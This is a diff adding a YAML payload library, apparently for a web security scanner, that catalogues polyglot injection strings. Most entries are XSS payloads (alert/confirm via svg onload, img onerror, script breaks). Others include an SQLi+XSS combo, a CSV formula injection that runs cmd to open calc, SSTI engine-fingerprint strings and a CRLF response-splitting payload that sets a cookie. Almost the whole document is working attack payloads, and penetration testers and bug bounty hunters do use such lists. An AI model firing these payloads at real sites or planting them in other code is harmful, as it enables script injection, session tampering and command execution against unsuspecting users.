@@ -1,0 +1,215 @@
+id: polyglots
+name: Polyglot Payloads
+version: 1.0.0
+category: injection
+description: |
+  Polyglot strings that trigger across multiple parsing contexts (HTML, JS, CSS,
+  URL, attribute, JSON) in a single payload. Useful when the injection sink is
+  unknown. Includes XSS polyglots (0xsobky, BRUTELOGIC) plus a few SQLi+XSS combo
+  polyglots.
+mitre:
+  - T1059
+owasp_top10:
+  - A03:2021
+references:
+  - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+  - https://brutelogic.com.br/blog/xss-polyglot/
+related_tools:
+  - dalfox
+  - xsstrike
+  - nuclei
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: ultimate_polyglot
+    name: 0xsobky ultimate polyglot
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+    notes: Fires across HTML, JS, attribute, URI contexts
+    source: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+  - id: brutelogic_polyglot
+    name: BRUTELOGIC polyglot
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      ">'><img src=x onerror=confirm(1)>
+    notes: Tag, attribute, and string-break in one
+    source: https://brutelogic.com.br/blog/xss-polyglot/
+  - id: hk_polyglot
+    name: Heyimbasti polyglot
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      </script><svg/onload=alert(1)>
+    notes: Closes script then injects SVG
+    source: common knowledge
+  - id: js_string_polyglot
+    name: JS string-context polyglot
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      ';alert(1)//
+    notes: Breaks single-quoted JS strings
+    source: common knowledge
+  - id: js_double_polyglot
+    name: JS double-string polyglot
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      ";alert(1);//
+    notes: null
+    source: common knowledge
+  - id: attr_break_polyglot
+    name: Attribute break polyglot
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      "><svg onload=alert(1)>
+    notes: For unquoted/single/double-quoted attributes
+    source: common knowledge
+  - id: comment_break
+    name: HTML comment break
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      --!><svg onload=alert(1)>
+    notes: Closes -- ! > comment
+    source: common knowledge
+  - id: sqli_xss_combo
+    name: SQLi + XSS polyglot
+    subcategory: combo
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      1'><svg onload=alert(1)>--
+    notes: SQLi string break + XSS in case of reflected output
+    source: common knowledge
+  - id: csv_injection_polyglot
+    name: CSV injection polyglot
+    subcategory: csv
+    encoding: raw
+    tech_targets: [excel]
+    severity_when_works: high
+    payload: |
+      =cmd|' /C calc'!A0
+    notes: For exports later opened in Excel
+    source: https://owasp.org/www-community/attacks/CSV_Injection
+  - id: ssti_polyglot
+    name: SSTI engine-fingerprint polyglot
+    subcategory: ssti
+    encoding: raw
+    tech_targets: [jinja2, twig, freemarker, erb, smarty]
+    severity_when_works: medium
+    payload: |
+      ${{<%[%'"}}%\.
+    notes: Triggers errors in multiple engines for detection
+    source: https://github.com/epinna/tplmap
+  - id: url_open_redirect_xss
+    name: "javascript: URI + open redirect"
+    subcategory: combo
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>
+    notes: For URL params that flow into href and HTML
+    source: common knowledge
+  - id: dom_polyglot
+    name: DOM-context polyglot
+    subcategory: xss
+    encoding: raw
+    tech_targets: [browser]
+    severity_when_works: high
+    payload: |
+      #"><img src=x onerror=alert(1)>
+    notes: Hash fragment that escapes attribute context
+    source: common knowledge
+  - id: header_injection_polyglot
+    name: CRLF + header set
+    subcategory: crlf
+    encoding: url
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      %0d%0aSet-Cookie:%20pwn=1%0d%0a%0d%0a<script>alert(1)</script>
+    notes: Splits response and injects body
+    source: common knowledge
+  - id: ssti_jinja_short
+    name: Jinja2 quick polyglot
+    subcategory: ssti
+    encoding: raw
+    tech_targets: [jinja2, python]
+    severity_when_works: high
+    payload: |
+      {{7*7}}
+    notes: Quick fingerprint
+    source: common knowledge
+  - id: ssti_double_brace
+    name: Engine fingerprint braces
+    subcategory: ssti
+    encoding: raw
+    tech_targets: [twig, jinja2, smarty]
+    severity_when_works: medium
+    payload: |
+      ${7*7}{{7*7}}<%=7*7%>#{7*7}
+    notes: One string that probes 4 SSTI engines
+    source: https://github.com/epinna/tplmap
+  - id: xss_keypress
+    name: Body onpageshow polyglot
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      "><body onpageshow=alert(1)>
+    notes: Bypasses CSP that allows body event handlers
+    source: common knowledge
+  - id: js_template_literal_polyglot
+    name: JS template-literal break
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      `};alert(1)//
+    notes: Breaks ES6 template-literal context
+    source: common knowledge
+  - id: css_expr_polyglot
+    name: CSS expression polyglot (legacy IE)
+    subcategory: xss
+    encoding: raw
+    tech_targets: [ie]
+    severity_when_works: low
+    payload: |
+      </style><svg onload=alert(1)>
+    notes: Closes style; works also where CSS context
+    source: common knowledge
+  - id: json_dom_polyglot
+    name: JSON-context polyglot
+    subcategory: xss
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      "}--><svg onload=alert(1)>
+    notes: Breaks JSON-in-HTML embedding
+    source: common knowledge
